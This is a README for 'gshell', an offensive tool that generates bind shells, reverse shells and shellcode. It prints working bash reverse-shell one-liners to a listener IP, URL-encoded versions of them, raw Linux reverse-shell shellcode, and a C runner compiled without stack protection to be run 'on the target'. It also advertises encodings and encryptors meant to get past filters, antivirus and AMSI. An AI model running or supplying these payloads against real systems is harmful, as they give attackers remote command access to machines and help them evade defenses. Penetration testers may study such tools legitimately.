# Introduction

[![made-with-python](http://forthebadge.com/images/badges/made-with-python.svg)](https://www.python.org/)
[![built-with-love](https://forthebadge.com/images/badges/built-with-love.svg)](https://forthebadge.com)

> **WARNING**: This is a development branch expect empty stuff and empty outputs.

A simple yet flexible cross-platform shell generator tool.

> Name: G(Great) Shell

Description: A cross-platform shell generator tool that lets you generate whichever shell you want, in any system you want, giving you full control and automation.

**If you find this tool helpful, then please give me a ⭐ as it tells me that I should add more features to it. (THANKS)**

Is cross-platform, you can use it in operating systems such as:

- Unix-based systems
- GNU/Linux
- Windows
- macOS

Generates the following shells:

- Bind Shells: The target has a listening port and we connect to the target.
- Reverse Shells: We have a listening port and the target connects to us.

Supports the following encodings (as of now):

- URL Encoding: Bypass URL filters
- Base64/32/16 Encodings: Bypass string/keyword filters
- PowerShell Base64 Encoding

Supports the follow IP versions:

- IPv4
- IPv6

Supported protocols:

- TCP
- UDP
- ICMP

**Note: You can add your own shells that use other protocols such as DNS**. 

Supports the following languages and tools:

- PowerShell
- Python
- Bash
- Sh
- Perl
- Socat
- Netcat
- Nc
- Awk
- Lua
- NodeJS
- OpenSSL
- PHP
- Ruby
- Telnet
- Golang
- C#
- Dart
- Groovy
- Many more...

**It is limitless, feel free to add as many as you desire!**

**The shells are stored in markdown files as it makes it easy for everyone.**

You can add more bind shells by adding markdown code blocks the following file:

```sh
shells/bind_shells.md
```

You can also add more reverse shells by adding markdown code blocks the following file:

```sh
shells/reverse_shells.md
```

These can be one-liners and multi-liners, it doesn't matter. You can even add C# multi-liners code blocks if you want.

Here is a reverse shell example command:

```bash
bash -i >& /dev/tcp/192.168.10.11/433 0>&1
```

To add another shell simply replace the IP address and the port placeholders or variables values with these placeholders in your code or command:

- `$ip`: IP address
- `$port`: Port number

Here is an example:

```
bash -i >& /dev/tcp/$ip/$port 0>&1
```

> Note: It also offers advice and tips for performing and troubleshooting attacks.

# Overview

This is the help menu:

```powershell
PS C:\gshell> python .\gshell.py -h
usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--shellcode] [--srev] [--sbind] [--windows] [--linux] [--base64]
                 [--base32] [--base16] [--url] [--obfuscate] [--xor] [--aes] [--des] [--rc2] [--caesar] [--no-block] [--list] [--advice] [-h]

 ██████  ███████ ██   ██ ███████ ██      ██      
██       ██      ██   ██ ██      ██      ██      
██   ███ ███████ ███████ █████   ██      ██      
██    ██      ██ ██   ██ ██      ██      ██      
 ██████  ███████ ██   ██ ███████ ███████ ███████ 

Generate shellcodes, bind shells and/or reverse shells with style

            Version: 1.3 dev
            Author: nozerobit
            Twitter: @nozerobit

Options:
  -i <IP ADDRESS>, --ip <IP ADDRESS>
                        Specify the IP address
  -p <PORT NUMBER>, --port <PORT NUMBER>
                        Specify the port number
  -s <SHELL TYPE>, --shell <SHELL TYPE>
                        Specify a shell type (python, nc, bash, etc)

Payload Types:
  -r, --reverse         Victim communicates back to the attacking machine
  -b, --bind            Open up a listener on the victim machine

Snippets Types:
  --hollowing           Print process hollowing code snippets
  --injector            Print process injector code snippets

Shellcode Types:
  --shellcode           Generate shellcodes, requires --srev or --sbind and --windows or --linux
  --srev                Reverse shell shellcode
  --sbind               Bind shell shellcode
  --windows             Windows shellcode
  --linux               Linux shellcode

Encoding Options:
  --base64              Add base64 encoding to payload types
  --base32              Add base32 encoding to payload types
  --base16              Add base16 encoding to payload types
  --url                 Add URL encoding to payload types

Obfuscation Options:
  --obfuscate           Obfuscate payload types

Encryptor Options:
  --xor                 XOR encrypt shellcode types
  --aes                 AES encrypt shellcode types
  --des                 DES encrypt shellcode types
  --rc2                 RC2 encrypt shellcode types
  --caesar              Caesar encrypt shellcode types

Markdown Options:
  --no-block            Skip ```
                        code
                        blocks
                        ``` while parsing

Help Options:
  --list                List the available shell types
  --advice              Print advice and tips to get connections
  -h, --help            Show this help message and exit
```

## Example of Listeners and Connectors

Connect with [nc](https://linux.die.net/man/1/nc) TCP:

```sh
nc -v <IP> <PORT>
```

Connect with [nc](https://linux.die.net/man/1/nc) UDP:

```sh
nc -vu <IP> <PORT>
```

> Note: Replace `<IP>` with the IP address of the target and replace `<PORT>` with the target port number.

Setup a listener with [nc](https://linux.die.net/man/1/nc) TCP:

```sh
nc -vlp <PORT>
```

Setup a listener with [nc](https://linux.die.net/man/1/nc) UDP:

```sh
nc -vulp <PORT>
```

> Note: Replace `<PORT>` with the port number of the target.

## Example of Bind Shells & Reverse Shells

Example, generate bash reverse shells:

```sh
PS C:\gshell> python .\gshell.py -i 192.168.111.120 -p 443  -r -s bash 
[+] The IPv4 address: 192.168.111.120 is valid.
[+] The port number: 443 is valid.
[+] Shell type is valid
[+] Preparing reverse shells
[+] Generating bash shells
bash -i >& /dev/tcp/192.168.111.120/443 0>&1

----------------NEXT CODE BLOCK----------------

0<&196;exec 196<>/dev/tcp/192.168.111.120/443; sh <&196 >&196 2>&196

----------------NEXT CODE BLOCK----------------

/bin/bash -l > /dev/tcp/192.168.111.120/443 0<&1 2>&1

----------------NEXT CODE BLOCK----------------

bash -i >& /dev/tcp/192.168.111.120/443 0>&1

----------------NEXT CODE BLOCK----------------

bash -i >& /dev/udp/192.168.111.120/443 0>&1
```

## Example of Encodings

Here is an example of an encoding:

```sh
PS C:\gshell> python .\gshell.py -i 192.168.111.120 -p 443 -r -s bash --url 
[+] The IPv4 address: 192.168.111.120 is valid.
[+] The port number: 443 is valid.
[+] Shell type is valid
[+] Preparing reverse shells
[+] Generating bash shells
[+] Adding URL Encoding
bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.111.120%2F443+0%3E%261%0A

----------------NEXT CODE BLOCK----------------

0%3C%26196%3Bexec+196%3C%3E%2Fdev%2Ftcp%2F192.168.111.120%2F443%3B+sh+%3C%26196+%3E%26196+2%3E%26196%0A

----------------NEXT CODE BLOCK----------------

%2Fbin%2Fbash+-l+%3E+%2Fdev%2Ftcp%2F192.168.111.120%2F443+0%3C%261+2%3E%261%0A

----------------NEXT CODE BLOCK----------------

bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.111.120%2F443+0%3E%261%0A

----------------NEXT CODE BLOCK----------------

bash+-i+%3E%26+%2Fdev%2Fudp%2F192.168.111.120%2F443+0%3E%261

----------------NEXT CODE BLOCK----------------

```

## Example of Shellcodes

Here is an example of a shellcode:

```sh
PS C:\gshell> python .\gshell.py -i 192.168.220.131 -p 4433 --shellcode --srev --linux
[+] The IPv4 address: 192.168.220.131 is valid.
[+] The port number: 4433 is valid.
[+] Generating reverse shell shellcodes
[+] Generating Linux shellcodes
\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\x1\x1\x1\x1\xbb\xc1\xa9\xdd\x82\x31\xc3\x53\x66\x68\x11\x51\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

We could use the generate shellcode in another program or script:

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
    unsigned char code[] = "SHELLCODE_HERE";
    printf("The shellcode length is: %d\n", strlen(code));
    void (*s)() = (void *)code;
    s();
    return 0;
}
```

Install 32-bit headers and libraries:

```sh
sudo apt-get install gcc-multilib
```

As an example we could compile the code above:

```sh
gcc -m32 -fno-stack-protector -z execstack example.c -o example
```

> More information about gcc compilation can be [found here](https://stackoverflow.com/questions/54082459/fatal-error-bits-libc-header-start-h-no-such-file-or-directory-while-compili).

Run the `example` program on the target to receive the reverse shell:

```sh
chmod +x ./example && ./example
```

# Installation in Linux

Clone or download the repository:

```sh
git clone https://github.com/nozerobit/gshell
```

Install the requirements:

```sh
python3 -m pip install -r gshell/requirements.txt
```

Add the tool to the `$PATH` environment variable:

```sh
sudo ln -s $(pwd)/gshell/gshell.py /usr/local/bin/gshell.py && chmod +x /usr/local/bin/gshell.py
```

Execute the tool:

```sh
gshell.py
```

# Installation in Windows

Clone or download the repository:

```sh
git clone https://github.com/nozerobit/gshell C:\\Tools
```

> Note: I created a directory named `Tools` in the `C:\` root directory.
> You can create this directory with the command `md C:\Tools`.

Install chocolatey with CMD as Administrator:

```cmd
@powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString('https://chocolatey.org/install.ps1'))" && SET PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin
```

Install python3 in Windows:

```powershell
choco install -y python3
```

Install pip:

```powershell
python -m pip install --upgrade pip
```

Install the requirements:

```powershell
python -m pip install -r gshell/requirements.txt
```

> Note: You can change the directory if you want, just make sure that it contains the `gshell` project folder.

Change to the project directory:

```powershell
cd C:\Tools
```

Execute the tool:

```powershell
python gshell.py
```

# Contact & Contributing

If you find any issues then you can open an issue or contact me on [twitter](https://twitter.com/nozerobit).

If you want to contribute then please feel free.

Any suggestions, feedback, pull requests and comments are welcome!

# Disclaimer

Any harm brought by this tool is not the responsibility of any contributors or the author.

# Credits

This project was heavily inspired by these other projects so I would like to give them credits:

- [markdown-code-runner (fork)](https://github.com/iesahin/markdown-code-runner)
- [OSEP-Code-Snippets](https://github.com/chvancooten/OSEP-Code-Snippets)

# ToDo

The version 2.0 should have the following:

[ ] Encryptors: To bypass AVs
[ ] Obfuscators: To bypass AVs
[ ] Anti-AMSI: To bypass AMSI
[ ] Add Windows Shellcode